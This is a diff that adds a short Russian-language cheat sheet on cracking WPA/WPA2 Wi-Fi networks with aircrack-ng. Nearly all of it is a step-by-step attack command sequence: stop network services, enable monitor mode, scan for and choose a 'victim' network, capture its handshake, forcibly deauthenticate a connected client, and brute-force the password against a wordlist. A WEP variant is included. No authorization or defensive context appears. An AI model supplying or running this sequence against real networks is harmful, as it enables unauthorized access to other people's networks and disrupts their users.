@@ -1,0 +1,37 @@
+-------------------
+-- Взлом wpa2 --
+----------------------------------------
+-- Взламываем wpa2 wpa (без wps) --
+----------------------------------------
+
+$ sudo pacman -S aircrack-ng  # установим утилиту дя взлома
+
+$ sudo iwconfig  # определим имя нашего беспроводного соединения
+
+$ sudo airmon-ng check  # смотрим что мешает нам перевести wifi в режим мониторинга. Выдаст что-то вроде этого
+
+   PID Name
+   498 NetworkManager
+   501 avahi-daemon
+   543 avahi-daemon
+   659 wpa_supplicant
+
+$ sudo systemctl stop NetworkManager  # останавливаем серсис
+
+$ sudo systemctl stop wpa_supplicant  # останавливаем серсис
+
+$ sudo systemctl stop avahi-daemon.service  # останавливаем серсис
+
+$ sudo kill ...  # убиваем процессы (название процессов)
+
+$ sudo  airmon-ng start wlan0  # переводим wifi в режим мониторинга
+
+$ sudo airodump-ng mon0  # проведем мониторинг сети и выберем жертву
+
+$ sudo airodump-ng mon0 --bssid 00:26:5A:6D:C8:B6 -w wpa2  # пытаемся получить хэндшейк (если отключен wps) (bssid пишем адресс выбранной жерты)
+
+$ sudo airodump-ng mon0 --bssid 00:26:5A:6D:C9:25 -w wep --ivs.  # такая команда, есди это wep
+
+$ sudo aireplay-ng mon0 -0 100 -a 00:26:5A:6D:C8:B6 -c 00:24:2C:13:9E:49  # запускаем еще один терминал (предыдущий не закрываем) и отключаем жертву от сети (жертва будт пытаться подключиться к сети и в результате, мы получим хэндшейк)
+
+$ sudo aircrack-ng -w password.txt -b 00:26:5A:6D:C8:B6 wpa2*.cap  # закрывае все терминалы и запускаем новый. Указываем путь к файлику с паролями и путь к хэндшейку
